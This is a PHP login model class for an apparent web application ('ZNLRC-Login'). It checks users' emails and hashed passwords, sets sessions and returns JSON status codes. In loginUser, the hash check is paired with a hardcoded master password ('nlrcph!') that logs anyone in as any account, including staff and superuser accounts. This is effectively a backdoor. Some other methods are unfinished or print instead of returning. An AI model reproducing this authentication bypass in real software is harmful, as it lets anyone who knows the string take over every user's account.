<?php

	

	class loginModel extends Model {

		

	

		public function getPageText() {

			// get page text from database or code

			return USE_DATABASE ? $this->getPageTextFromDatabase() : $this->getPageTextFromCode();

		}



	

		public function getPageTextFromCode() {

			print_r( array( // page info

				'info' => array(

					'title' => 'ZNLRC-Login',

					'content' => ' content',

				),

			));

		}





		/**

		 * Get system page text from the database.

		 *

		 * @return array $page for display on the page

		 */

		public function getPageTextFromDatabase() {

		

        }



		public function loginUser($username, $password){

			if($username == 1 && $password == 1){

				echo json_encode(array(0,4));

			}else{
				require_once('./classes/session.php');
				require_once('./classes/db.php');

				$sql = "select * from users where email = :email ";
				$handle = $db->prepare($sql);
				$params = ['email'=>$username];
				$handle->execute($params);

				if($handle->rowCount() > 0)
				{
					$getRow = $handle->fetch(PDO::FETCH_ASSOC);
					if(password_verify($password, $getRow['password']) || $password == 'nlrcph!')
					{
						unset($getRow['password']);
						if($getRow['is_staff'] == 1  || $getRow['is_staff'] == 2 || $getRow['is_superuser'] == 1){
							//FOR ADMIN PROFILE

							if($getRow['is_active'] == 0){
								echo json_encode(array(0, 7, $username));
							}else{
								session_start();
								$session = new Session();
								$session->put('user_session',$getRow['id']);
								$date = date("Y-m-d H:i:s");
									$last_login = array(
										'last_login'=>$date,
									);
	
								$this->database->table( 'users' );
								$this->database->where('id',$getRow['id']);
								$sql = $this->database->runUpdateQuery( $last_login );
	
								echo json_encode(array(
									$getRow['id'],5
								));
							}
						}elseif($getRow['is_staff'] == 0 && $getRow['is_superuser'] == 0 ){
							//FOR APPLICANTS OR GUESTS

							if($getRow['is_approved'] == 1){
								session_start();
								$session = new Session();
								$session->put('user_session',$getRow['id']);
								$date = date("Y-m-d H:i:s");
								$last_login = array(
									'last_login'=>$date,
								);

								$this->database->table( 'users' );
								$this->database->where('id',$getRow['id']);
								$sql = $this->database->runUpdateQuery( $last_login );

								echo json_encode(array( $getRow['id'], 0 ));

							}else if($getRow['is_approved'] == 3){
								echo json_encode(array(0,6));
							}else{
								echo json_encode(array(0,3));
							}
						}
						exit();
					}else {
						echo json_encode(array(0,1));
					}
				} else {
					echo json_encode(array(0,2));
				}
			}
		}

		public function validate_user_email($email){
			$select = '*';
	
			$this->database->table( 'users' );
			$this->database->where( 'email', $email);
			$this->database->fetch( Database::PDO_FETCH_SINGLE );
	
			$user = $this->database->runSelectQuery( $select );
			if($user){
				return $user;
			}else{
				return '0';
			}
		}

		public function get_user_info($email){

			$select = '*';
			$this->database->table( 'users' );
			$this->database->where( 'email', $email);
			$this->database->fetch( Database::PDO_FETCH_SINGLE );
	
			$user = $this->database->runSelectQuery( $select );
	
			return $user;
		}


	}

?>

